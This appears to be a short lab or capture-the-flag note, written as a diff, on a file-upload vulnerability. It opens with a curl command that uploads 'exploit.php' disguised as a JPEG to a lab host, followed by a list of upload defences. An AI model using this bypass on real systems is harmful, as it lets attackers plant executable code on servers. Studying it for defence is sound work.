@@ -1,0 +1,22 @@
+curl -F "Upload=Upload" -F 'uploaded=@exploit.php;type=image/jpeg' http://10.12.100.159/\?page\=upload > haha.html
+
+
+File uploads represent an easy way for an attacker to inject malicious code
+into your application.
+
+
+-Segregate Your Uploads.
+
+-Ensure Upload Files Cannot Be Executed.
+
+-Rename Files on Upload.
+
+-Validate File Formats and Extensions.
+
+-Validate the Content-Type Header.
+
+-Use a Virus Scanner.
+
+-Check File Sizes.
+
+-Sanitize Filenames.
